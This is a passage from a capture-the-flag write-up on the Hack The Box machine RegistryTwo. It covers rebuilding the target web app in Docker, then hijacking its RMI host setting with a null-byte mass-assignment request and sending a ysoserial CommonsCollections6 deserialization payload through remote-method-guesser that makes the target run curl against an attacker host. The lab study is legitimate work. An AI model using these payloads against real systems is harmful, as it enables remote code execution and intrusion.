<span class="mtk1">            </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(String.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk4">"Connecting to %s:%d"</span><span class="mtk1">, </span><span class="mtk1">rmiHost</span><span class="mtk1">, </span><span class="mtk8 mtku">Settings</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk8 mtku">Integer</span><span class="mtk1">.</span><span class="mtk5">class</span><span class="mtk1">, (</span><span class="mtk8 mtku">String</span><span class="mtk1">)</span><span class="mtk4">"rmi.port"</span><span class="mtk1">, (</span><span class="mtk8 mtku">Object</span><span class="mtk1">)</span><span class="mtk6">9999</span><span class="mtk1">)));</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Registry</span><span class="mtk1"> </span><span class="mtk1">registry</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> LocateRegistry.</span><span class="mtk8">getRegistry</span><span class="mtk1">(</span><span class="mtk1">rmiHost</span><span class="mtk1">, (</span><span class="mtk8 mtku">Integer</span><span class="mtk1">)</span><span class="mtk8 mtku">Settings</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk8 mtku">Integer</span><span class="mtk1">.</span><span class="mtk5">class</span><span class="mtk1">, (</span><span class="mtk8 mtku">String</span><span class="mtk1">)</span><span class="mtk4">"rmi.port"</span><span class="mtk1">, (</span><span class="mtk8 mtku">Object</span><span class="mtk1">)</span><span class="mtk6">9999</span><span class="mtk1">));</span>  
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk8 mtku">FileService</span><span class="mtk1">)</span><span class="mtk1">registry</span><span class="mtk1">.</span><span class="mtk8">lookup</span><span class="mtk1">(</span><span class="mtk4">"FileService"</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">printStackTrace</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">RuntimeException</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Notice that the <code>rmi.host</code> must contain the string <code>.htb</code>.</p><p>The RMI server is supposed to have implemented the functions that appear the <code>FileService</code> interface:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> * </span>
<span class="mtk3"> * Could not load the following classes:</span>
<span class="mtk3"> *  com.htb.hosting.rmi.AbstractFile</span>
<span class="mtk3"> *  com.htb.hosting.rmi.FileService</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">AbstractFile</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">IOException</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">Remote</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">List</span><span class="mtk1">;</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">interface</span><span class="mtk1"> </span><span class="mtk8 mtku">FileService</span>
<span class="mtk5">extends</span><span class="mtk1"> </span><span class="mtk8 mtku">Remote</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk8 mtku">List</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">AbstractFile</span><span class="mtk1">&gt; </span><span class="mtk8">list</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">, </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var2</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>  

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk8">uploadFile</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">, </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var2</span><span class="mtk1">, </span><span class="mtk7 mtki">byte</span><span class="mtk1">[] </span><span class="mtk9 mtki">var3</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">IOException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk8">createDirectory</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">, </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var2</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">byte</span><span class="mtk1">[] </span><span class="mtk8">view</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">, </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var2</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">IOException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk8 mtku">AbstractFile</span><span class="mtk1"> </span><span class="mtk8">getFile</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">, </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var2</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk8 mtku">AbstractFile</span><span class="mtk1"> </span><span class="mtk8">getFile</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">deleteDomain</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk8">newDomain</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">byte</span><span class="mtk1">[] </span><span class="mtk8">view</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk9 mtki">var1</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><h2 id="rmi-exploitation">RMI exploitation</h2><p>For the moment, let&rsquo;s run the WAR file locally and test the attack. In order to get no errors, we need to set up a MySQL server with these tables (file named as <code>docker-entrypoint-initdb.d/db.sql</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">CREATE</span><span class="mtk1"> </span><span class="mtk5">TABLE</span><span class="mtk1"> </span><span class="mtk8">users</span><span class="mtk1"> (</span>
<span class="mtk1">    id            </span><span class="mtk5">binary</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">)   </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    nickname      </span><span class="mtk7 mtki">VARCHAR</span><span class="mtk1">(</span><span class="mtk6">255</span><span class="mtk1">) </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    email         </span><span class="mtk7 mtki">VARCHAR</span><span class="mtk1">(</span><span class="mtk6">255</span><span class="mtk1">) </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    password_hash </span><span class="mtk7 mtki">VARCHAR</span><span class="mtk1">(</span><span class="mtk6">255</span><span class="mtk1">) </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk5">role</span><span class="mtk1">          </span><span class="mtk7 mtki">VARCHAR</span><span class="mtk1">(</span><span class="mtk6">255</span><span class="mtk1">) </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk5">PRIMARY KEY</span><span class="mtk1"> (id)</span>
<span class="mtk1">);</span>

<span class="mtk5">CREATE</span><span class="mtk1"> </span><span class="mtk5">TABLE</span><span class="mtk1"> </span><span class="mtk8">domains</span><span class="mtk1"> (</span>
<span class="mtk1">    id          </span><span class="mtk5">binary</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">)   </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk5">description</span><span class="mtk1"> </span><span class="mtk7 mtki">VARCHAR</span><span class="mtk1">(</span><span class="mtk6">255</span><span class="mtk1">) </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    vhost       </span><span class="mtk7 mtki">VARCHAR</span><span class="mtk1">(</span><span class="mtk6">255</span><span class="mtk1">) </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    user_id     </span><span class="mtk5">binary</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">)   </span><span class="mtk5">NOT NULL</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk5">PRIMARY KEY</span><span class="mtk1"> (id),</span>
<span class="mtk1">    </span><span class="mtk5">FOREIGN KEY</span><span class="mtk1"> (user_id) </span><span class="mtk5">REFERENCES</span><span class="mtk1"> users (id)</span>  
<span class="mtk1">);</span>
</code></pre></div><p>The information above comes from <code>models</code> (<code>User</code> and <code>Domain</code> classes). Also, <code>UUID</code> is supported by MySQL as <code>binary(16)</code> (more information <a target="_blank" href="https://dev.mysql.com/blog-archive/mysql-8-0-uuid-support/">here</a>).</p><p>I will use Docker containers:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>/docker-entrypoint-initdb.d:/docker-entrypoint-initdb.d"</span> -e MYSQL_DATABASE=hosting -e MYSQL_ROOT_PASSWORD=O8lBvQUBPU4CMbvJmYqY -p 3306:3306 -it mysql
[Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.34-1.el8 started.
[Note] [Entrypoint]: Switching to dedicated user 'mysql'
[Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.34-1.el8 started.
[Note] [Entrypoint]: Initializing database files
[Warning] [MY-011068] [Server] The syntax '--skip-host-cache' is deprecated and will be removed in a future release. Please use SET GLOBAL host_cache_size=0 instead.
[System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.34) initializing of server in progress as process 80
[System] [MY-013576] [InnoDB] InnoDB initialization has started.
[System] [MY-013577] [InnoDB] InnoDB initialization has ended.
[Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.
[Note] [Entrypoint]: Database files initialized
[Note] [Entrypoint]: Starting temporary server
mysqld will log errors to /var/lib/mysql/b64d6bdff753.err
mysqld is running as pid 125
[Note] [Entrypoint]: Temporary server started.
'/var/lib/mysql/mysql.sock' -&gt; '/var/run/mysqld/mysqld.sock'
Warning: Unable to load '/usr/share/zoneinfo/iso3166.tab' as time zone. Skipping it.
Warning: Unable to load '/usr/share/zoneinfo/leap-seconds.list' as time zone. Skipping it.
Warning: Unable to load '/usr/share/zoneinfo/leapseconds' as time zone. Skipping it.
Warning: Unable to load '/usr/share/zoneinfo/tzdata.zi' as time zone. Skipping it.
Warning: Unable to load '/usr/share/zoneinfo/zone.tab' as time zone. Skipping it.
Warning: Unable to load '/usr/share/zoneinfo/zone1970.tab' as time zone. Skipping it.
[Note] [Entrypoint]: Creating database hosting

[Note] [Entrypoint]: /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/db.sql


[Note] [Entrypoint]: Stopping temporary server
[Note] [Entrypoint]: Temporary server stopped

[Note] [Entrypoint]: MySQL init process done. Ready for start up.

[Warning] [MY-011068] [Server] The syntax '--skip-host-cache' is deprecated and will be removed in a future release. Please use SET GLOBAL host_cache_size=0 instead.
[System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.34) starting as process 1
[System] [MY-013576] [InnoDB] InnoDB initialization has started.
[System] [MY-013577] [InnoDB] InnoDB initialization has ended.
[Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
[System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
[Warning] [MY-011810] [Server] Insecure configuration for --pid-file: Location '/var/run/mysqld' in the path is accessible to all OS users. Consider choosing a different directory.  
[System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
[System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.34'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.
</code></pre></div><p>Now, to run the WAR file, we will use another Docker container with a Tomcat (9.0.2) image. We also need to enter the <code>hosting.ini</code> file (a bit different because of the MySQL connection) and set <code>registry.webhosting.htb</code> in <code>/etc/hosts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Mon Jan 30 21:05:01 GMT 2023</span>
<span class="mtk5">mysql.password<span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
<span class="mtk5">rmi.host<span>=<span class="mtk4">registry.webhosting.htb</span>
<span class="mtk5">mysql.user<span>=<span class="mtk4">root</span>
<span class="mtk5">mysql.port<span>=<span class="mtk4">3306</span>
<span class="mtk5">mysql.host<span>=<span class="mtk4">192.168.1.132</span>
<span class="mtk5">domains.start-template<span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
<span class="mtk5">domains.max<span>=<span class="mtk4">5</span>
<span class="mtk5">rmi.port<span>=<span class="mtk4">9002</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>:/home/rocky"</span> -p 8080:8080 tomcat:9.0.2 bash
root@a4c9f6e5a3b4:/usr/local/tomcat# cp /home/rocky/hosting.ini /etc
root@a4c9f6e5a3b4:/usr/local/tomcat# cp /home/rocky/hosting.war webapps
root@a4c9f6e5a3b4:/usr/local/tomcat# echo '192.168.1.132 registry.webhosting.htb' &gt;&gt; /etc/hosts
root@a4c9f6e5a3b4:/usr/local/tomcat#
root@a4c9f6e5a3b4:/usr/local/tomcat# catalina.sh run
Using CATALINA_BASE:   /usr/local/tomcat
Using CATALINA_HOME:   /usr/local/tomcat
Using CATALINA_TMPDIR: /usr/local/tomcat/temp
Using JRE_HOME:        /docker-java-home
Using CLASSPATH:       /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar
NOTE: Picked up JDK_JAVA_OPTIONS:  --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version:        Apache Tomcat/9.0.2
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 25 2017 21:08:02 UTC
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server number:         9.0.2.0
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.15.49-linuxkit-pr
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          aarch64
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-9-openjdk-arm64
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           9.0.1+11-Debian-1
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Oracle Corporation
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.lang=ALL-UNNAMED
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded APR based Apache Tomcat Native library [1.2.16] using APR version [1.6.3].
INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true].
INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR/OpenSSL configuration: useAprConnector [false], useOpenSSL [true]
INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized [OpenSSL 1.1.0g  2 Nov 2017]
INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-8009"]
INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 241 ms
INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet Engine: Apache Tomcat/9.0.2
INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/usr/local/tomcat/webapps/hosting.war]
INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.  
INFO [main] com.htb.hosting.utils.config.ConfigSchedule.contextInitialized Initializing config watcher
INFO [main] com.htb.hosting.utils.config.ConfigSchedule$1.onChange Config watcher detected file changes
INFO [main] org.hibernate.Version.logVersion HHH000412: Hibernate ORM core version 5.4.16.Final
INFO [main] org.hibernate.annotations.common.reflection.java.JavaReflectionManager.&lt;clinit&gt; HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
WARN [main] org.hibernate.engine.jdbc.connections.internal.DriverManagerConnectionProviderImpl.configure HHH10001002: Using Hibernate built-in connection pool (not for production use!)
INFO [main] org.hibernate.engine.jdbc.connections.internal.DriverManagerConnectionProviderImpl.buildCreator HHH10001005: using driver [com.mysql.cj.jdbc.Driver] at URL [jdbc:mysql://192.168.1.132:3306/hosting?allowPublicKeyRetrieval=true&useSSL=false&serverTimezone=Europe/Rome]
INFO [main] org.hibernate.engine.jdbc.connections.internal.DriverManagerConnectionProviderImpl.buildCreator HHH10001001: Connection properties: {password=****, user=root}
INFO [main] org.hibernate.engine.jdbc.connections.internal.DriverManagerConnectionProviderImpl.buildCreator HHH10001003: Autocommit mode: false
INFO [main] org.hibernate.engine.jdbc.connections.internal.DriverManagerConnectionProviderImpl$PooledConnections.&lt;init&gt; HHH000115: Hibernate connection pool size: 20 (min=1)
INFO [main] org.hibernate.dialect.Dialect.&lt;init&gt; HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/usr/local/tomcat/webapps/hosting.war] has finished in [1,786] ms
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [13] ms
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [8] ms
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [7] ms
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [67] ms
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [8] ms
INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["ajp-nio-8009"]
INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1949 ms
</code></pre></div><p>And now we have the same web application in our local environment:</p><p><img alt="RegistryTwo 26" src="/images/HTB/RegistryTwo/RegistryTwo-26.webp"></p><p>If we start <code>nc</code> on port 9002 and we try to create a new domain, we will get a hit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 9002
Ncat: Version 7.94 ( https://nmap.org/ncat )  
Ncat: Listening on [::]:9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 192.168.1.132:56182.
JRMIK
</code></pre></div><p>And this is the event logged in the Tomcat server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">INFO [http-nio-8080-exec-9] com.htb.hosting.rmi.RMIClientWrapper.get Connecting to registry.webhosting.htb:9002  
</code></pre></div><p>But here we have cheated, since we have set our IP address for <code>registry.webhosting.htb</code>. We need to somehow enter our IP address so that it contains <code>.htb</code> and it is still valid for RMI. Actually, if we add a null byte between the IP address and <code>.htb</code>, it will still work (<code>10.10.17.44\x00.htb</code>). Let&rsquo;s use the mass assignment vulnerability for that:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8080/hosting/reconfigure -d <span class="code-dark-yellow">'rmi.host=192.168.1.132%00.htb'</span> -H <span class="code-dark-yellow">'Cookie: JSESSIONID=B80CCB6B4738BFF2C491C9D5DABBF32B'</span>  
</code></pre></div><p>At this point, I started looking at how RMI works, developing some <a target="_blank" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/hello/hello-world.html">client-server examples</a> and trying to adapt them to this challenge. I was able to define a <code>FileService</code> implementation that was consumed by the Tomcat RMI client, but when I tried to get code execution, it was on my machine (the RMI server), and not in Tomcat.</p><p>Then, I thought that it would be more difficult to achieve code execution on the RMI client, so I started looking for automated tools like <a target="_blank" href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> or <a target="_blank" href="https://github.com/qtc-de/remote-method-guesser">remote-method-guesser</a> (<code>rmg</code>). Actually, option <code>listen</code> from <code>rmg</code> was helpful to get RCE, because it sends a deserialization payload. We just need to do the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">java</span> -jar <span class="mtku">rmg-4.4.1-jar-with-dependencies.jar</span> listen --yso <span class="mtku">ysoserial-all.jar</span> 0.0.0.0 9002 CommonsCollections6 <span class="code-dark-yellow">"curl 192.168.1.132:9999/rce"</span>  
[+] Creating ysoserial payload... done.
[+] Creating a <span class="code-dark-yellow">JRMPListener</span> on <span class="code-dark-blue">0.0.0.0:9002.</span>
[+] Handing off to <span class="code-dark-blue">ysoserial...</span>
</code></pre></div><p>Now, if we trigger the RMI method call (doing some stuff with the domains of the website), we will get a connection:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">java</span> -jar <span class="mtku">rmg-4.4.1-jar-with-dependencies.jar</span> listen --yso <span class="mtku">ysoserial-all.jar</span> 0.0.0.0 9002 CommonsCollections6 <span class="code-dark-yellow">"curl 192.168.1.132:9999/rce"</span>  
[+] Creating ysoserial payload... done.
[+] Creating a <span class="code-dark-yellow">JRMPListener</span> on <span class="code-dark-blue">0.0.0.0:9002.</span>
[+] Handing off to <span class="code-dark-blue">ysoserial...</span>
Have connection from /192.168.1.132:65047
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
